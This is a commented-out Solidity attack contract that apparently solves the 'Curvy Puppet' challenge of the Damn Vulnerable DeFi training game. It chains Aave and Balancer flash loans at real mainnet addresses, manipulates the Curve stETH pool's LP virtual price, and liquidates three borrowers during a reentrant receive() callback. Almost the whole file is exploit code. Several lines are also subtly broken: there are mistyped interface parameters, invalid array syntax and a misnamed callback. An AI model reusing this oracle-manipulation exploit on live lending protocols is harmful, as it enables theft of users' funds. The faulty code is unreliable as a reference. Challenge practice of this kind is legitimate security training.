// // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
// pragma solidity =0.8.25;

// import {Test, console} from "forge-std/Test.sol";
// import {IPermit2} from "permit2/interfaces/IPermit2.sol";
// import {WETH} from "solmate/tokens/WETH.sol";
// import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
// import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
// import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
// import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

// interface IAaveFlashLoan {
//     function flashLoan(
//         address recieverAddress,
//         address[] calldata assets,
//         address[] calldata amount,
//         address[] calldata modes,
//         address onBehalfOf,
//         bytes calldata params,
//         uint16 referralCodes
//     ) external ;
// }

// interface IBalancerVault {
//     function flashLoan(
//         address recipient,
//         address[] memory tokens,
//         uint256[] memory amounts,
//         bytes memory userData
//     ) external ;
// }


// contract Attack {
    
//     IStableSwap public curvePool;
//     CurvyPuppetLending public lending;
//     IERC20 public curvyLpToken;
//     address public player;
//     uint256 public treasuryLpToken;
//     IERC20 stETH;
//     WETH weth;
//     address treasury;
//     DamnValuableToken dvt;

//     IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
//     IAaveFlashLoan AaveV2 = IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
//     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

//     constructor (
//         IStableSwap _curvePool,
//         CurvyPuppetLending _lending,
//         IERC20 _curvyLpToken,
//         address _player,
//         uint256 _treasuryLpToken,
//         IERC20 _stETH,
//         WETH _weth,
//         address _treasury,
//         DamnValuableToken _dvt
//     ) {
//         curvePool = _curvePool;
//         lending = _lending;
//         curvyLpToken = _curvyLpToken;
//         player = _player;
//         treasuryLpToken = _treasuryLpToken;
//         stETH = _stETH;
//         weth = _weth;
//         treasury = _treasury;
//         dvt = _dvt;
//     }

//     function manipulateCP() public {
//         // Step 1: Add liquidity to the CurvePool
//         weth.withdraw(58685 ether);

//         console.log("LP token price before remove liquidity", curvePool.get_virtual_price());

//         stETH.approve(address(curvePool), type(uint256).max);

//         uint256[2] memory amount;
//         amount[0] =  58685 ether;
//         amount[1] = stETH.balanceOf(address(this));
//         console.log("my weth balance is: ", weth.balanceOf(address(this)));
//         console.log("my eth balance is: ", address(this).balance);

//         curvePool.add_liquidity{value: 58685 ether}(amount, 0);

//         // uint256 virtualPrice = curvePool.get_virtual_price();

//         console.log("LP token after liquidity", curvePool.get_virtual_price());
//     }

//     function removeLiquidity() public {
//         uint256[2] memory min_amnt = [uint256(0), uint256(0)];
//         uint256 lpBalance = curvyLpToken.balanceOf(address(this));

//         curvePool.remove_liquidity(lpBalance - 3000000000000000001, min_amnt);

//         console.log("LP token price after2 removing liquidity:", curvePool.get_virtual_price());

//     }

//     function execAttack() public {
//         // Allow lending contract to pull collateral
//         IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
 
//         permit2.approve({
//             token: curvePool.lp_token(),
//             spender: address(lending),
//             amount: 5e18,
//             expiration: uint48(block.timestamp)
//         });
//         stETH.approve(address(AaveV2), type(uint256).max);
//         weth.approve(address(AaveV2), type(uint256).max);

//         address[] memory assets = new address[](2);
//         assets[0] = address(stETH);
//         assets[1] = address(weth);
//         uint256[] memory amounts = new uint256[](2);
//         amounts[0] = 172000 * 1e18;
//         amounts[1] = 20500 * 1e18;
//         uint256[] memory modes = new uint256[](2);
//         modes[0] = 0;
//         modes[1] = 0;
 
//         AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
//         weth.transfer(treasury,weth.balanceOf(address(this)));
//         curvyLpToken.transfer(treasury,1);
//         dvt.transfer(treasury,7500e18);        
//     }

//     function execOperation(
//         address[] memory assets,
//         uint256[] memory amounts,
//         address[] memory premiums,
//         address initiator,
//         bytes memory param
//     ) external returns (bool) {
//         console.log("Aave flashLoan steth Balance", stETH.balanceOf(address(this)));
//         console.log("wETH Balancer: " , weth.balanceOf(address(Balancer)));
//         address[] memory tokens = new address()[1];
//         tokens[0] = address(weth);
//         uint256[] memory amounts = new uint256()[1];
//         amounts[0] = 37991 ether;
//         bytes memory userData = "";
//         Balancer.flashLoan(address(this), tokens, amounts, userData);
//         return true;
//     }

//     function receiveFlashLoan(
//         address[] memory tokens,
//         uint256[] memory amounts,
//         uint256[] memory feeAmounts,
//         bytes memory userData
//     ) external {
//         manipulateCP();
//         removeLiquidity();

//         weth.deposit{value: 37991 ether}();
//         weth.transfer(address(Balancer), 37991 ether);

//         uint256 ethAmount = 12963923469069977697655;
//         uint256 min_dy = 1; 
//         curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
//         weth.deposit{value: 20518 ether}();
//         console.log(" stETH balance2:",stETH.balanceOf(address(this)));
//         console.log(" wETH balance2:",weth.balanceOf(address(this)));         
//         console.log(" ETH balance2:",(address(this).balance));
//         console.log(" my LP balance2:", curvyLpToken.balanceOf(address(this)));

//     }

//     receive() external payable {
//         if (msg.sender == address(curvePool)) {
//             console.log("LP token price during removing liquidity:", curvePool.get_virtual_price());
//         address[3] memory users = [
//             0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,  // Alice
//             0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,  // Bob
//             0xea475d60c118d7058beF4bDd9c32bA51139a74e0   // Charlie
//         ];
//         console.log("msg.sender",address(this));
//         for (uint256 i = 0; i < users.length; i++) {
//             lending.liquidate(users[i]);
//             console.log("Liquidated user:", users[i]);
//         }

//          }
//     }




// }